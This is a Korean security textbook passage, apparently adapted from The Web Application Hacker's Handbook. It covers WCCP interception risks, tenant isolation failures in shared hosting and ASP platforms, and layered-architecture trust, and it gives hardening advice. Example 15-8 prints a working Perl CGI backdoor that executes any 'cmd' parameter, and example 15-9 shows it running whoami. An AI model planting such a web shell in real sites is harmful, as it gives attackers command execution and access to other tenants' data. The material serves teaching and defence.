**로드 밸런싱.** 라우팅에 더해 WCCP 라우터는 여러 수신 서버 사이에 부하를 분산할 수 있다. WCCP 라우터와 수신 서버들은 하트비트 메시지를 교환해 서로가 살아 있음을 알린다. 특정 수신 서버가 하트비트를 멈추면 WCCP 라우터는 요청 트래픽을 그 노드로 리다이렉트하지 않고 인터넷으로 직접 보낸다. 그 노드가 서비스로 복귀하면 라우터가 다시 하트비트를 받기 시작하고 그 노드로 요청 트래픽을 보내는 것을 재개한다.

### 15.8.4 WCCP의 보안적 성질

세 가지를 짚는다.

**첫째, 이것은 인터셉션이다.** 클라이언트는 자기 요청이 캐시에 도달했다는 것을 모른다. 그 결과가 무엇인지는 이 책이 이미 두 번 서술했다.

- **13.5절**: 클라이언트가 자기가 프록시와 말하고 있다는 것을 모르므로 **전체 URI가 아니라 부분 URI를 보낸다.** 캐시는 목적지를 `Host` 헤더에서 얻어야 하고, 그 값은 클라이언트가 통제한다(15.2절). 인터셉션 구성에서 캐시의 목적지 판정이 클라이언트 통제 문자열에 걸리는 것은 회피할 수 없는 결과다.
- **14.8절**: 공유 캐시가 요청 경로에 있으면 캐시 키의 동등성 판정이 기밀성 문제가 된다. 명시적 프록시라면 사용자가 그 캐시의 존재를 알고 정책을 감안할 수 있지만, **인터셉션 구성에서는 그럴 기회가 없다.** 사용자와 콘텐츠 제공자 어느 쪽도 자기 트래픽이 어느 캐시를 지나는지 모른다.

**둘째, 제어 평면의 인증이 약하다.** 표 15-10의 첫 행을 다시 읽자. **보안 옵션에 `WCCP2_NO_SECURITY`(0)가 존재한다.** 즉 인증 없는 운영이 프로토콜 상의 정상 선택지다. 인증을 켜도 그것은 **최대 8옥텟의 서비스 그룹 비밀번호를 공유하는 MD5 방식**이다.

15.6.6절에서 정식화한 문장이 여기에 그대로 적용된다. **이 평면에 참여할 수 있는 자는 트래픽의 방향 자체를 결정한다.** `WCCP2_HERE_I_AM`을 보낼 수 있으면 서비스 그룹에 캐시로 합류할 수 있고, 그러면 그 그룹이 리다이렉트하는 트래픽의 일부가 자기에게 온다. `WCCP2_REDIRECT_ASSIGN`은 지정 캐시가 보내는 메시지이며 로드 밸런싱 배정 — 어느 캐시가 어느 버킷을 받는가 — 을 결정한다. 이 메시지들을 만들 수 있는 위치는 데이터 평면의 어떤 방어보다 위에 있다. TLS 종료 지점, WAF, 인증 미들웨어 — 트래픽이 애초에 다른 곳으로 흐르면 전부 관여하지 못한다.

**셋째, 클라이언트 IP가 보존된다는 것은 양날이다.** GRE 캡슐화 덕분에 캐시는 클라이언트를 식별할 수 있다. 로깅과 정책 판단에는 필요한 정보다. 동시에 그것은 **사용자 커뮤니티 전체의 브라우징 기록이 클라이언트 IP와 함께 캐시에 쌓인다**는 뜻이다. 명시적 프록시라면 사용자가 그것을 알고 있지만 인터셉션에서는 그렇지 않다. 14.9절이 클라이언트 측 캐시에 대해, 16.4절이 로그 일반에 대해 다루는 문제가 여기서는 **동의 없이** 성립한다.

**강화의 방향.**

- 서비스 그룹에서 `WCCP2_NO_SECURITY`를 쓰지 않는다. 인증을 켜고, 8옥텟 제한 안에서 가능한 최선의 비밀을 쓰며, 그것을 다른 용도와 공유하지 않는다.
- **제어 평면을 데이터 평면과 분리된 네트워크에 둔다.** 라우터와 캐시 사이의 WCCP 메시지가 사용자 트래픽과 같은 세그먼트를 흐르지 않게 한다. 이것이 15.10절이 서술할 "컴포넌트 분리"를 인프라 계층에 적용한 것이다.
- 서비스 그룹의 구성원 목록을 명시적으로 관리하고, 예상 밖의 `HERE_I_AM`을 관측 대상으로 삼는다.
- 인터셉션 구성에서 캐시가 `Host` 헤더를 어떻게 다루는지 확인한다. 부분 URI + `Host`로 목적지를 판정하는 이상, 그 판정 규칙이 원 서버의 판정 규칙과 일치해야 한다(→ 13.12, 14.8).

> **이 절이 뒷받침하는 것**
>
> - 인터셉션이 부분 URI와 `Host` 의존을 강제한다는 사실 → **13.5**, **15.2**
> - 인터셉션이 클라이언트 동의 없이 공유 캐시를 경로에 놓는다는 사실 → **14.8** (공유 캐시의 보안 함의), **14.9**
> - 제어 평면이 데이터 평면보다 위의 신뢰 경계라는 사실 → **15.6.6** (NECP), **15.10** (컴포넌트 분리)
> - 캐시에 쌓이는 클라이언트 식별 정보 → **16.4** (로그가 누출하는 것)

## 15.9 공유 호스팅과 ASP 환경 공격 — 공유 애플리케이션 서비스, 테넌트 격리 실패

15.1절이 호스팅의 형태를 나열하며 표 15-1을 아래로 읽으면 공유되는 것이 늘어나고 격리의 단위가 내려간다고 했다. 이 절은 그 표의 아래 두 행 — 고객이 임의 스크립트를 올릴 수 있는 공유 호스팅과, 하나의 애플리케이션을 여러 고객이 나눠 쓰는 ASP 환경 — 에서 격리가 실제로 어떻게 실패하는지를 본다.

> 이 절과 다음 절의 내용은 **31.1절과 31.2절**에서 다시 나타난다. 역할 분담은 이렇다. 이 장은 그것을 **배치 형태(deployment topology)의 성질**로 — 무엇을 어디에 얹었기에 이런 문제가 생기는가로 — 서술한다. 31장은 같은 것을 **공격자의 방법론**으로 — 애플리케이션을 마주한 테스터가 무엇을 어떤 순서로 시도하는가로 — 서술한다. 두 서술의 근거는 같은 WAHH 17장이다.

### 15.9.1 두 가지 위협

많은 조직이 자기 웹 애플리케이션을 대중에게 전달하기 위해 외부 제공자를 쓴다. 그 형태는 15.1절이 서술한 대로 단순 호스팅부터 ASP까지 걸쳐 있다.

**웹·애플리케이션 호스팅 서비스 제공자 대부분은 고객이 많고, 대개 여러 고객의 애플리케이션을 같은 인프라 또는 밀접하게 연결된 인프라로 지원한다.** 이런 서비스를 쓰기로 한 조직은 다음 두 위협을 반드시 고려해야 한다.

- **악의적 고객** — 서비스 제공자의 악의적인 고객이 우리 조직의 애플리케이션과 데이터를 간섭하려 시도할 수 있다.
- **부주의한 고객** — 어떤 고객이 취약한 애플리케이션을 배포하면, 악의적 사용자가 그것을 통해 공유 인프라를 장악하고 그것으로 우리 조직의 애플리케이션과 데이터를 공격할 수 있다.

**공유 시스템에 호스팅된 웹 사이트는 가능한 한 많은 사이트를 훼손하려는 스크립트 키디의 일차 표적이다.** 공유 호스트 하나를 장악하면 겉보기에 독립적인 수백 개 웹 사이트를 짧은 시간에 공격할 수 있기 때문이다.

### 15.9.2 가상 호스팅과 공유 애플리케이션 서비스

단순 공유 호스팅에서 웹 서버는 서로 다른 도메인 이름을 가진 여러 가상 웹 사이트를 지원하도록 설정될 뿐이다. **이것은 `Host` 헤더로 달성되며, `Host`는 HTTP 1.1에서 필수다.** 브라우저가 HTTP 요청을 낼 때 해당 URL의 도메인 이름을 담은 `Host` 헤더를 포함하고, 그 도메인 이름에 연결된 IP 주소로 요청을 보낸다. 여러 도메인 이름이 같은 IP 주소로 해석되더라도 그 주소의 서버는 요청이 어느 웹 사이트를 향한 것인지 판정할 수 있다. Apache는 다음 설정으로 가상 사이트마다 다른 웹 루트 디렉터리를 지정한다.

```apache
<VirtualHost *>
  ServerName wahh-app1.com
  DocumentRoot /www/app1
</VirtualHost>

<VirtualHost *>
  ServerName wahh-app2.com
  DocumentRoot /www/app2
</VirtualHost>
```

*예제 15-7. 두 사이트를 얹는 Apache 가상 호스트 설정 (WAHH 17장 기준)*

**여기서 15.2절과 이 절이 만난다.** 두 고객을 나누는 것은 `DocumentRoot` 두 줄이고, 어느 줄이 적용될지를 정하는 것은 클라이언트가 보낸 `Host` 문자열이다. 이 문자열이 예상 밖일 때 무슨 일이 생기는지가 12.9절이고, 두 `DocumentRoot`가 파일 시스템 수준에서 실제로 분리되어 있는지가 이 절이다.

**공유 애플리케이션 서비스.** 많은 ASP는 고객이 자기 용도로 적응·맞춤할 수 있는 기성 애플리케이션을 제공한다. 이 모델은 **수많은 사업자가 최종 사용자에게 본질적으로 같은 기능을 제공하는 고기능·복잡 애플리케이션을 배포해야 하는 산업**에서 비용 효율적이다. ASP의 서비스를 쓰면 사업자는 큰 구축·유지 비용 없이 자기 브랜드에 맞는 애플리케이션을 빠르게 확보할 수 있다.

ASP 애플리케이션 시장은 특히 금융 서비스 산업에서 성숙했다. 어느 나라에 매장 결제 카드와 신용 편의를 고객에게 제공하려는 소매업자가 수천 곳 있다고 하자. 이들은 그 기능을 수십 곳의 신용카드 제공자에게 외주하는데, 그 제공자 상당수는 오래된 은행이 아니라 신생 기업이다. 이들은 비용이 주된 차별점인 상품화된 서비스를 제공하며, 따라서 다수가 최종 사용자에게 제공되는 웹 애플리케이션을 ASP를 통해 전달한다. **그 결과 각 ASP 안에서 하나의 같은 애플리케이션이 엄청난 수의 서로 다른 소매업자를 위해 맞춤화된다.**

**표 15-11. 전형적인 ASP 환경의 역할 분담 (WAHH 그림 17-5 기준)**

| 주체 | 하는 일 |
|---|---|
| ASP | 인프라를 호스팅·유지하고, 핵심 애플리케이션을 개발하고, 갱신과 지원을 제공한다 |
| 신용카드 제공자 | 자기 사업 제안에 맞게 핵심 기능을 맞춤화한다 |
| 소매업자 | 애플리케이션의 스킨과 비기능적 콘텐츠를 맞춤화한다 |
| 최종 사용자 | 애플리케이션으로 명세서를 조회하고 결제한다 |

관여하는 주체와 작업의 수만 보아도 이 구성이 기본 공유 호스팅 모델과 같은 종류의 보안 문제를 갖되 **더 복잡하다**는 것을 알 수 있다. 게다가 이 구성에만 있는 문제가 더 있다.

### 15.9.3 접근 메커니즘에 대한 공격

**공유 환경의 여러 애플리케이션을 갱신·맞춤화할 정당한 필요가 외부 조직들에게 있으므로, 제공자는 그 원격 접근을 실현할 메커니즘을 구현해야 한다.** 가장 단순한 가상 호스팅 웹 사이트의 경우, 고객이 자기 웹 루트 안에 파일을 쓸 수 있는 FTP나 SCP 같은 업로드 설비만 있으면 된다.

호스팅에 데이터베이스가 포함되면 고객은 자기 DB 설정을 구성하고 애플리케이션이 저장한 데이터를 조회하기 위해 직접 접근이 필요할 수 있다. 이 경우 제공자는 특정 DB 관리 기능에 대한 웹 인터페이스를 구현하거나, 심지어 **실제 데이터베이스 서비스를 인터넷에 노출해** 고객이 자기 도구로 직접 접속하게 하기도 한다.

여러 유형의 고객이 공유 애플리케이션의 요소에 서로 다른 수준의 맞춤화를 수행해야 하는 본격적 ASP 환경에서는, 제공자가 그 작업을 위한 고기능 애플리케이션을 구현하는 경우가 많다. 이런 애플리케이션은 대개 VPN이나 ASP 인프라로의 전용 사설 회선을 통해 접근된다.

존재할 수 있는 원격 접근 메커니즘의 범위를 감안하면 공유 환경에 대한 여러 공격이 가능하다.

**첫째, 원격 접근 메커니즘 자체가 안전하지 않을 수 있다.** FTP 프로토콜은 암호화되지 않으므로 적절한 위치에 있는 공격자(예를 들어 고객 자신의 ISP 안)가 로그인 자격증명을 포착할 수 있다. 접근 메커니즘에 패치되지 않은 소프트웨어 취약점이나 설정 결함이 있어서 익명 공격자가 그 메커니즘을 장악하고 고객의 애플리케이션과 데이터를 간섭할 수도 있다.

**둘째, 원격 접근 메커니즘이 부여하는 접근이 지나치게 관대하거나 고객 간 분리가 부실할 수 있다.** 파일 접근만 필요한 고객에게 **명령 셸**이 주어지는 경우가 그 예다. 또는 고객이 자기 디렉터리로 제한되지 않아 **다른 고객의 콘텐츠를 갱신**하거나 **서버 운영체제의 민감한 파일에 접근**할 수 있다.

**셋째, 데이터베이스에도 파일 시스템과 같은 고려가 적용된다.** 데이터베이스가 고객마다 별도 인스턴스로 적절히 분리되어 있지 않을 수 있다. 직접 DB 커넥션이 표준 ODBC 같은 **암호화되지 않은 채널**을 쓸 수 있다.

**넷째, 원격 접근을 위해 맞춤 애플리케이션이 배포된 경우(ASP가 그렇다), 그 애플리케이션은 서로 다른 고객의 공유 애플리케이션 접근을 통제할 책임을 지게 된다.** 그 관리 애플리케이션의 어떤 취약점이든 악의적 고객이나 심지어 익명 사용자가 다른 고객의 애플리케이션을 간섭하게 만들 수 있다. 또한 **자기 애플리케이션의 스킨만 갱신할 수 있는 제한된 권한의 고객이 권한을 상승시켜 자기에게 유리하게 핵심 기능의 요소를 수정하게** 만들 수도 있다. 이런 종류의 관리 애플리케이션이 배포된 곳에서는 **그 애플리케이션의 어떤 취약점이든 최종 사용자가 접근하는 공유 애플리케이션을 공격하는 통로가 된다.**

### 15.9.4 애플리케이션 사이의 공격

공유 호스팅 환경에서는 서로 다른 고객이 서버에 임의의 스크립트를 업로드하고 실행할 정당한 필요를 갖는 것이 보통이다. **이것은 단일 호스팅 애플리케이션에는 존재하지 않는 문제를 즉시 일으킨다.**

#### 의도적 백도어

가장 명백한 공격에서는 악의적 고객이 **서버 자체나 다른 고객의 애플리케이션을 공격하는 콘텐츠를 업로드한다.** 서버에 원격 명령 설비를 구현하는 Perl 스크립트가 그 예다.

```perl
#!/usr/bin/perl
use strict;
use CGI qw(:standard escapeHTML);
print header, start_html("");
if (param()) {
    my $command = param("cmd");
    $command = `$command`;
    print "$command\n";
}
else { print start_form(), textfield("command"); }
print end_html;
```

*예제 15-8. 공유 호스트에 업로드된 백도어 스크립트 (WAHH 17장 기준)*

이 스크립트에 인터넷으로 접근하면 고객은 서버에서 임의의 운영체제 명령을 실행할 수 있다.

```
GET /scripts/backdoor.pl?cmd=whoami HTTP/1.1
Host: wahh-maliciousapp.com

HTTP/1.1 200 OK
Server: Apache/2.0.59
Content-Type: text/html; charset=ISO-8859-1

...
apache
...
```

*예제 15-9. 백도어를 통한 명령 실행과 그 결과 (WAHH 17장 기준)*

**응답 본문의 `apache` 한 단어가 이 절의 핵심이다.** 악의적 고객의 명령이 `apache` 사용자로 실행되고 있으므로, 그 사용자가 접근할 수 있는 것 — 즉 **같은 공유 호스팅 서비스의 다른 고객들의 스크립트와 데이터** — 에 접근할 수 있을 가능성이 높다. 여러 고객의 콘텐츠가 하나의 웹 서버 프로세스 사용자로 서비스되고 있다면, 웹 서버가 읽을 수 있는 모든 것을 임의의 고객이 읽을 수 있다는 뜻이다.

이 위협은 ASP가 관리하는 공유 애플리케이션 맥락에도 존재한다. 핵심 기능은 ASP가 소유·갱신하지만 개별 고객은 대개 정해진 방식으로 그 기능을 수정할 수 있다. **악의적 고객이 자기가 통제하는 코드에 미묘한 백도어를 심어 공유 애플리케이션을 장악하고 다른 고객의 데이터에 접근할 수 있다.**

#### 취약한 애플리케이션 사이의 공격

공유 환경의 모든 고객이 선의를 갖고 있고 환경 소유자가 검증한 정당한 스크립트만 올린다 해도, **개별 고객의 애플리케이션에 자기도 모르게 취약점이 존재하면 애플리케이션 간 공격은 물론 가능하다.** 이 경우 하나의 애플리케이션에 있는 취약점 하나가 악의적 사용자로 하여금 그 애플리케이션과 공유 환경의 다른 모든 애플리케이션을 장악하게 만든다. 흔한 취약점 유형 다수가 여기에 해당한다.

- **한 애플리케이션의 SQL 인젝션 결함**으로 공유 데이터베이스에 임의 SQL 질의를 수행할 수 있다. 고객 간 DB 접근이 적절히 분리되어 있지 않으면 공격자는 모든 애플리케이션이 쓰는 데이터를 읽고 수정할 수 있다(→ 27장).
- **한 애플리케이션의 경로 순회 취약점**으로 서버 파일 시스템 어디에나 있는 임의 파일을 읽거나 쓸 수 있다. 다른 애플리케이션에 속한 파일도 포함된다(→ 28장).
- **한 애플리케이션의 명령 인젝션 결함**으로 악의적 고객의 경우와 같은 방식으로 서버와 그 위의 다른 애플리케이션을 장악할 수 있다(→ 28장).

#### ASP 애플리케이션 컴포넌트 사이의 공격

앞의 공격은 모두 공유 ASP 애플리케이션 맥락에서도 일어날 수 있다. 고객이 대개 핵심 애플리케이션 기능에 자기 맞춤화를 수행할 수 있으므로, **한 고객이 도입한 취약점이 맞춤화된 애플리케이션의 사용자로 하여금 주 공유 애플리케이션을 공격하게 만들고, 그럼으로써 ASP의 모든 고객의 데이터를 위태롭게 할 수 있다.**

여기에 더해 ASP 시나리오는 공유 애플리케이션의 서로 다른 컴포넌트가 상호 운용되어야 한다는 점 때문에 악의적 고객·사용자가 더 넓은 공유 애플리케이션을 장악할 가능성을 추가로 만든다.

**첫째, 서로 다른 애플리케이션이 생성한 데이터가 공통 위치에 모여, 공유 애플리케이션 안에서 강력한 권한을 가진 ASP 수준 사용자에게 조회된다.** 이것은 **맞춤화된 애플리케이션 안의 XSS 유형 공격이 공유 애플리케이션의 장악으로 이어질 수 있다**는 뜻이다. 공격자가 로그 파일 항목, 결제 기록, 개인 연락처 정보에 JavaScript 코드를 주입할 수 있으면 ASP 수준 사용자의 세션을 탈취해 민감한 관리 기능에 접근할 수 있다(→ 32장, 16.6).

**둘째, ASP는 흔히 모든 고객의 데이터를 담는 공유 데이터베이스를 쓴다.** 데이터 접근의 엄격한 분리가 애플리케이션 계층과 데이터베이스 계층에서 강제될 수도 있고 아닐 수도 있다. **그러나 어느 경우든 여러 고객의 데이터를 처리하는 공유 컴포넌트가 대개 존재한다.** 데이터베이스 저장 프로시저가 그 예다. 이 컴포넌트의 결함 있는 신뢰 관계나 취약점이 악의적 고객·사용자로 하여금 다른 애플리케이션의 데이터에 접근하게 만들 수 있다. **정의자 권한(definer privileges)으로 실행되는 공유 저장 프로시저의 SQL 인젝션 취약점은 공유 데이터베이스 전체의 장악으로 이어질 수 있다.**

### 15.9.5 테넌트 격리 실패의 정식화

앞의 사례들을 하나의 축으로 정렬하면 이렇게 된다. **공유 환경에서 격리는 어느 한 층이 담당하는 것이 아니라 여러 층이 겹쳐서 담당하며, 각 층은 무엇을 막고 무엇을 못 막는지가 정해져 있다.**

**표 15-12. 격리의 층위와 그 층이 막는 것·못 막는 것 (이 책의 정리)**

| 격리의 층 | 구현 형태 | 막는 것 | 못 막는 것 |
|---|---|---|---|
| **가상 호스트 설정** | `DocumentRoot` 분리 | 정상 요청이 다른 고객의 문서 트리에 매핑되는 것 | 경로 순회, 파일 시스템을 직접 읽는 코드, 기본 호스트로의 접근(→ 12.9) |
| **파일 시스템 권한** | 디렉터리 소유권과 모드 | 다른 고객의 파일에 대한 읽기·쓰기 | 모든 고객의 코드가 **같은 사용자**로 실행되는 경우 아무것도 막지 못한다 |
| **운영체제 계정** | 고객마다 별도 계정으로 스크립트 실행 | 한 고객의 코드가 다른 고객의 파일을 읽는 것, 강력한 시스템 함수 사용 | 커널·설정 파일·공유 임시 디렉터리를 통한 경로 |
| **데이터베이스 계정** | 고객마다 저권한 계정 | SQL 인젝션이 다른 고객의 테이블에 닿는 것 | 정의자 권한 저장 프로시저, DB 물리 파일에 대한 파일 시스템 접근 |
| **데이터베이스 인스턴스** | 고객마다 별도 인스턴스 | 위의 두 경로 모두 | 인스턴스 간 공유 계정, 관리 인터페이스 |
| **애플리케이션 로직** | ASP 앱 안의 테넌트 식별자 | 정상 흐름에서의 데이터 혼동 | 애플리케이션 결함 하나(→ 24장 접근 통제), 공유 로그·관리 화면을 통한 XSS |
| **호스트 분리** | 고객마다 별도 물리·논리 호스트 | 위의 거의 전부 | 공유 관리 인터페이스, 공유 네트워크, 공유 인증 |

표를 위에서 아래로 읽으면 **격리의 강도가 올라가고 비용도 올라간다.** 그리고 각 행의 "못 막는 것" 열은 그 층 위에 다른 층이 필요한 이유다. 이것이 심층 방어(defense in depth)라는 표현의 구체적 내용이다.

가장 중요한 행은 두 번째다. **모든 고객의 코드가 같은 웹 서버 사용자로 실행되면 파일 시스템 권한은 아무것도 격리하지 못한다.** 예제 15-9의 `apache`가 그 상태다. 이 상태에서 `DocumentRoot` 분리는 정상 요청 흐름에만 유효한 논리적 구획일 뿐이고, 코드가 파일 시스템을 직접 읽는 순간 그 구획은 존재하지 않는다.

### 15.9.6 공유 환경의 강화

공유 환경은 애플리케이션 보안에 새로운 종류의 위협 — 같은 설비의 악의적 고객이 제기하는 위협과, 환경에 취약점을 들여오는 부주의한 고객이 제기하는 위협 — 을 도입한다. **이 이중의 위험을 다루려면 공유 환경은 고객 접근, 분리, 신뢰의 관점에서 신중하게 설계되어야 하고, 단일 호스팅 애플리케이션에는 직접 적용되지 않는 통제를 구현해야 한다.**

#### 안전한 고객 접근

고객이 자기 통제하의 콘텐츠를 유지하기 위해 제공되는 메커니즘이 무엇이든, 그것은 제3자와 악의적 고객에 의한 무단 접근을 막아야 한다.

- **원격 접근 메커니즘은 견고한 인증을 구현하고, 도청에 취약하지 않은 암호 기술을 쓰며, 완전히 보안 강화되어야 한다.**
- **개별 고객에게는 최소 권한 원칙에 따라 접근이 부여되어야 한다.** 고객이 가상 호스팅 서버에 스크립트를 업로드한다면 **자기 문서 루트에 대한 읽기·쓰기 권한만** 가져야 한다. 공유 데이터베이스에 접근한다면 **다른 고객에게 속한 데이터나 컴포넌트에 접근할 수 없는 저권한 계정**으로 해야 한다.
- **고객 접근 제공을 위해 맞춤 애플리케이션이 쓰인다면, 그 애플리케이션은 공유 환경의 보안을 지키는 중대한 역할에 걸맞은 엄격한 보안 요구사항과 테스트의 대상이 되어야 한다.**

#### 고객 기능의 분리

**공유 환경의 고객이 취약점 없는 선량한 기능만 만들 것이라고 신뢰할 수 없다.** 따라서 견고한 해법은 15.10절이 서술할 아키텍처 통제를 써서 공유 환경과 그 고객들을 불량 콘텐츠를 통한 공격으로부터 보호해야 한다. 각 고객 코드에 허용되는 능력을 다음과 같이 분리해, **의도적이든 부주의로든 발생한 장악이 국지적으로 제한되고 다른 고객에게 영향을 미치지 못하게** 하는 일이다.

- **각 고객의 애플리케이션은 파일 시스템 접근에 별도의 운영체제 계정을 써야 하고, 그 계정은 그 애플리케이션의 파일 경로에만 읽기·쓰기 권한을 가져야 한다.**
- **강력한 시스템 함수와 명령에 접근하는 능력은 최소 권한 원칙에 따라 운영체제 수준에서 제한되어야 한다.**
- **공유 데이터베이스 안에도 같은 보호가 구현되어야 한다. 고객마다 별도의 데이터베이스 인스턴스를 쓰고, 자기 데이터에만 접근할 수 있는 저권한 계정을 고객에게 배정해야 한다.**

> **PHP safe mode가 남긴 교훈**
>
> LAMP 모델에 기반한 많은 공유 호스팅 환경이 악의적이거나 취약한 스크립트의 잠재적 영향을 제한하기 위해 **PHP의 safe mode**에 의존했다. 이 모드는 PHP 스크립트가 특정 강력한 PHP 함수에 접근하는 것을 막고 다른 함수의 동작에 제약을 건다.
>
> **그러나 이 제약들은 완전히 효과적이지 않았고 우회에 취약했다.** safe mode가 유용한 방어 층을 제공했을 수는 있으나, **악의적이거나 취약한 애플리케이션의 영향을 통제하기에는 구조적으로 잘못된 자리다. 그것은 운영체제가 애플리케이션 계층에게 자기 행동을 통제하라고 신뢰하는 일이기 때문이다.** 이 이유를 비롯한 여러 이유로 safe mode는 PHP 6에서 제거됐다.
>
> 이 문단은 이 장 전체의 논지를 한 문장으로 압축한다. **격리를 담당하는 층은 격리되는 대상보다 아래에 있어야 한다.** 표 15-12를 아래에서 위로 읽으면 그 이유가 보인다. 애플리케이션 로직이 자기 자신을 격리한다는 것은 판정자와 피판정자가 같다는 뜻이고, 그러면 판정자를 무너뜨리는 것으로 격리가 사라진다. 46.3절이 처리 인스턴스를 무상태로 만들고 배포와 실행을 분리하라고 말할 때 얻는 격리 효과는 여기서 필요한 것과 같은 방향이지만, **이 절의 요구는 더 강하다. 다른 테넌트가 임의 코드를 올린다는 것을 전제해야 하기 때문이다.**

#### 공유 애플리케이션 안의 컴포넌트 분리

여러 공유·맞춤 컴포넌트로 하나의 애플리케이션이 구성되는 ASP 환경에서는, **서로 다른 당사자의 통제 아래 있는 컴포넌트 사이에 신뢰 경계가 강제되어야 한다.**

데이터베이스 저장 프로시저 같은 공유 컴포넌트가 개별 고객에게 속한 맞춤 컴포넌트로부터 데이터를 받을 때, **그 데이터는 최종 사용자로부터 직접 온 것과 같은 수준의 불신으로 취급되어야 한다.** 각 컴포넌트는 자기 신뢰 경계 밖의 인접 컴포넌트로부터 출발하는 엄격한 보안 테스트의 대상이 되어야 하며, 그것으로 취약하거나 악의적인 컴포넌트가 더 넓은 애플리케이션을 장악하게 만드는 결함을 찾아야 한다. **특히 공유 로깅 기능과 관리 기능에 주의를 기울여야 한다.**

마지막 문장이 15.9.4절의 XSS 시나리오를 정확히 겨냥한다. 로그와 관리 화면은 **여러 테넌트의 데이터가 한곳에 모이는 지점**이며, 동시에 **가장 강력한 권한을 가진 사용자가 그것을 보는 지점**이다. 두 성질이 겹치는 자리가 공유 환경에서 가장 값비싼 표적이다(→ 16.6, 32장).

> **이 절이 뒷받침하는 것**
>
> - `Host` 헤더가 테넌트를 가르는 근거라는 사실 → **15.2**, **12.9**
> - 모든 테넌트의 코드가 같은 OS 사용자로 실행되는 상태 → **15.10** (컴포넌트 분리), **46.3** (프로세스 분리와의 대조)

## 15.10 계층 아키텍처 공격과 방어

15.9절이 **하나의 인프라 위에 여러 주체가 나란히 얹히는** 구성을 다뤘다면, 이 절은 **하나의 애플리케이션이 여러 층으로 나뉘어 쌓이는** 구성을 다룬다. 두 구성은 방향만 다를 뿐 같은 질문을 갖는다. **경계를 무엇이 지키는가.**

**웹 애플리케이션 아키텍처는 개별 애플리케이션의 보안을 평가할 때 자주 간과되는 중요한 보안 영역이다.** 흔히 쓰이는 계층 아키텍처에서 서로 다른 계층을 분리하는 데 실패하면, 한 계층의 결함 하나가 다른 계층들을, 따라서 애플리케이션 전체를 완전히 장악하는 데 악용될 수 있다.

### 15.10.1 계층 아키텍처

대부분의 웹 애플리케이션은 **다계층 아키텍처(multitiered architecture)** 를 쓴다. 애플리케이션의 사용자 인터페이스, 비즈니스 로직, 데이터 저장이 여러 계층으로 나뉘고, 그 계층들은 서로 다른 기술을 쓰거나 서로 다른 물리 컴퓨터에서 구현될 수 있다. 흔한 3계층 아키텍처는 다음과 같다.

- **프레젠테이션 계층** — 애플리케이션의 인터페이스를 구현한다
- **애플리케이션 계층** — 핵심 애플리케이션 로직을 구현한다
- **데이터 계층** — 애플리케이션 데이터를 저장하고 처리한다

실제로는 많은 복잡한 엔터프라이즈 애플리케이션이 더 세분화된 계층 분할을 쓴다. 자바 기반 애플리케이션은 다음 계층과 기술을 쓸 수 있다.

```
애플리케이션 서버 계층      (예: Tomcat)
프레젠테이션 계층           (예: WebWork)
인가·인증 계층              (예: JAAS, ACEGI)
핵심 애플리케이션 프레임워크 (예: Struts, Spring)
비즈니스 로직 계층          (예: Enterprise Java Beans)
데이터베이스 객체 관계 매핑  (예: Hibernate)
데이터베이스 JDBC 호출
데이터베이스 서버
```

*그림 15-5. 자바 기반 엔터프라이즈 애플리케이션의 계층 (WAHH 17장 기준)*

다계층 설계는 단일 계층 설계에 비해 여러 장점을 갖는다. 대부분의 소프트웨어가 그렇듯 **고도로 복잡한 처리 작업을 단순하고 모듈화된 기능 컴포넌트로 쪼개면 개발 관리와 버그 감소에 큰 이점이 있다.** 잘 정의된 인터페이스를 가진 개별 컴포넌트는 애플리케이션 안에서도, 애플리케이션 사이에서도 쉽게 재사용된다. 서로 다른 개발자가 다른 컴포넌트의 구현 세부를 깊이 이해하지 않고도 병렬로 작업할 수 있다. 한 계층의 기술을 교체해야 할 때 다른 계층에 미치는 영향이 최소화된다. **그리고 잘 구현되면 다계층 아키텍처는 애플리케이션 전체의 보안 태세를 향상시킬 수 있다.**

마지막 문장에서 **"잘 구현되면"** 이 조건이다. 1.4절이 계층 모델에 대해 서술한 문장이 여기서 애플리케이션 층위로 되돌아온다. **계층은 관심사를 분리하지만 신뢰를 분리하지 않는다.** 관심사의 분리는 계층을 나누는 것만으로 얻어지지만, 신뢰의 분리는 별도의 조치를 필요로 한다.

### 15.10.2 계층 아키텍처 공격의 세 범주

앞 문단의 귀결로, 다계층 아키텍처의 구현에 결함이 있으면 그 결함이 보안 취약점을 도입할 수 있다. **다계층 모델을 이해하면 서로 다른 보안 방어(접근 통제, 입력 검증 등)가 어디에 구현되어 있고 그것이 계층 경계를 넘어 어떻게 무너지는지를 파악하는 데 도움이 된다.** 부실하게 설계된 계층 아키텍처는 세 가지 넓은 범주의 공격을 가능하게 한다.

1. **계층 간 신뢰 관계를 악용해 한 계층에서 다른 계층으로 공격을 진전시킨다.**
2. **계층들이 부적절하게 분리되어 있으면, 한 계층의 결함으로 다른 계층에 구현된 보호를 직접 밑에서 무력화한다.**
3. **한 계층의 제한적 장악을 달성한 뒤, 다른 계층을 지탱하는 인프라를 직접 공격해 장악 범위를 그 계층들로 확장한다.**

### 15.10.3 계층 간 신뢰 관계 악용

**애플리케이션의 서로 다른 계층은 서로가 특정 방식으로 행동할 것이라고 신뢰할 수 있다.** 애플리케이션이 정상적으로 동작할 때 이 가정은 유효할 수 있다. 그러나 **이상 조건이나 능동적 공격 아래에서는 무너질 수 있다.** 이 상황에서 공격자는 이 신뢰 관계를 악용해 한 계층에서 다른 계층으로 공격을 진전시키고 침해의 규모를 키울 수 있다.

**많은 엔터프라이즈 애플리케이션에 존재하는 흔한 신뢰 관계 하나는 애플리케이션 계층이 사용자 접근 관리의 유일한 책임을 진다는 것이다.** 이 계층이 인증과 세션 관리를 처리하고 특정 요청을 허가할지 결정하는 모든 로직을 구현한다. 애플리케이션 계층이 요청을 허가하기로 하면 요청된 동작을 수행하도록 다른 계층에 관련 명령을 발행한다. **다른 계층들은 애플리케이션 계층이 접근 통제 검사를 적절히 수행했으리라 신뢰하고, 따라서 애플리케이션 계층으로부터 받은 모든 명령을 존중한다.**

**이런 유형의 신뢰 관계는 앞선 장들에서 살펴본 흔한 웹 취약점 다수를 사실상 악화시킨다.**

- **SQL 인젝션 결함이 존재하면 그것은 대개 애플리케이션이 소유한 모든 데이터에 접근하는 데 악용될 수 있다.** 애플리케이션이 DBA로 데이터베이스에 접근하지 않더라도, 애플리케이션의 모든 데이터를 읽고 갱신할 수 있는 단일 계정을 쓰는 것이 보통이다. **데이터베이스 계층은 자기 데이터에 대한 접근을 애플리케이션 계층이 적절히 통제해 주리라고 사실상 신뢰하고 있다**(→ 27장).
